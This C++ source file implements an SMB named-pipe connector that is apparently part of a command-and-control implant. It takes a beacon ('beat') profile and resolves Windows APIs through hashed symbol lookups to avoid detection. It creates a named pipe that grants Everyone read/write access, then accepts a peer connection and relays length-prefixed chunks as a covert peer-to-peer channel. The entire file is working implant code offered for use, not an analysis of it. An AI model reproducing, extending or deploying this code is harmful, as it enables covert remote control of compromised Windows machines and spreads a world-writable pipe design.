#include "ConnectorSMB.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"

ConnectorSMB::ConnectorSMB()
{
	this->functions = (SMBFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(SMBFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;
	this->functions->ReadFile     = ApiWin->ReadFile;
	this->functions->WriteFile    = ApiWin->WriteFile;

	this->functions->NtClose = ApiNt->NtClose;

	this->functions->CreateNamedPipeA    = ApiWin->CreateNamedPipeA;
	this->functions->DisconnectNamedPipe = ApiWin->DisconnectNamedPipe;
	this->functions->PeekNamedPipe       = ApiWin->PeekNamedPipe;
	this->functions->ConnectNamedPipe    = (decltype(ConnectNamedPipe)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_CONNECTNAMEDPIPE);
	this->functions->FlushFileBuffers    = (decltype(FlushFileBuffers)*) GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_FLUSHFILEBUFFERS);

	this->functions->AllocateAndInitializeSid     = (decltype(AllocateAndInitializeSid)*)     GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_ALLOCATEANDINITIALIZESID);
	this->functions->InitializeSecurityDescriptor = (decltype(InitializeSecurityDescriptor)*) GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_INITIALIZESECURITYDESCRIPTOR);
	this->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
	this->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
	this->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
}

BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
{
	PSID pEveryoneSID = NULL;
    SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
    *(DWORD*)pIdentifierAuthority.Value = 0;
    *(WORD*)&pIdentifierAuthority.Value[4] = 256;
    if (!this->functions->AllocateAndInitializeSid(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
        return FALSE;

	PACL pACL = NULL;
    EXPLICIT_ACCESS pListOfExplicitEntries = { 0 };
    pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE; //  STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL; // 
    pListOfExplicitEntries.grfAccessMode        = SET_ACCESS;
    pListOfExplicitEntries.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    pListOfExplicitEntries.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    pListOfExplicitEntries.Trustee.ptstrName    = (LPTSTR)pEveryoneSID;

    if (this->functions->SetEntriesInAclA(1, (PEXPLICIT_ACCESS_A) & pListOfExplicitEntries, 0, &pACL) != ERROR_SUCCESS)
        return FALSE;

    PSECURITY_DESCRIPTOR pSD = this->functions->LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!pSD || !this->functions->InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION) || !this->functions->SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) 
        return FALSE;

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), pSD, FALSE };
    this->hChannel = this->functions->CreateNamedPipeA((CHAR*) profile.pipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 0x100000, 0x100000, 0, &sa);
    if (this->hChannel == INVALID_HANDLE_VALUE)
        return FALSE;

    this->functions->FreeSid(pEveryoneSID);
    this->functions->LocalFree(pACL);
    this->functions->LocalFree(pSD);

    return TRUE;
}

void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;

    if (data && data_size) {
        DWORD NumberOfBytesWritten = 0;
        if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
            
            DWORD index = 0;
            DWORD size  = 0;
            NumberOfBytesWritten = 0;
            while (1) {
                size = data_size - index;
                if (data_size - index > 0x2000)
                    size = 0x2000;

                if ( !this->functions->WriteFile(this->hChannel, data + index, size, &NumberOfBytesWritten, 0) )
                    break;

                index += NumberOfBytesWritten;
                if (index >= data_size)
                    break;
            }
        }
        this->functions->FlushFileBuffers(this->hChannel);
    }

    DWORD totalBytesAvail = 0;
    BOOL result = this->functions->PeekNamedPipe(this->hChannel, 0, 0, 0, &totalBytesAvail, 0);
    if (result && totalBytesAvail >= 4) {

        DWORD NumberOfBytesRead = 0;
        DWORD dataLength = 0;
        if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
            
            if (dataLength > this->allocaSize) {
                this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
                this->allocaSize = dataLength;
            }

            NumberOfBytesRead = 0;
            int index = 0;
            while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
                index += NumberOfBytesRead;
        
                if (index > dataLength) {
                    this->recvSize = -1;
                    return;
                }

                if (index == dataLength)
                    break;
            }
            this->recvSize = index;
        }
    }
}

BYTE* ConnectorSMB::RecvData()
{
    return this->recvData;
}

int ConnectorSMB::RecvSize()
{
	return this->recvSize;
}

void ConnectorSMB::RecvClear()
{
    if ( this->recvData && this->allocaSize )
        memset(this->recvData, 0, this->recvSize);
    this->recvSize = 0;
}

void ConnectorSMB::Listen()
{
    while ( !this->functions->ConnectNamedPipe(this->hChannel, NULL) && this->functions->GetLastError() != ERROR_PIPE_CONNECTED);

    this->recvData = (BYTE*) this->functions->LocalAlloc(LPTR, 0x100000);
    this->allocaSize = 0x100000;
}

void ConnectorSMB::Disconnect() 
{
    if (this->allocaSize) {
        memset(this->recvData, 0, this->allocaSize);
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
    }

    this->allocaSize = 0;
    this->recvData = 0;

    this->functions->FlushFileBuffers(this->hChannel);
    this->functions->DisconnectNamedPipe(this->hChannel);
}

void ConnectorSMB::CloseConnector()
{
    this->functions->NtClose(this->hChannel);
}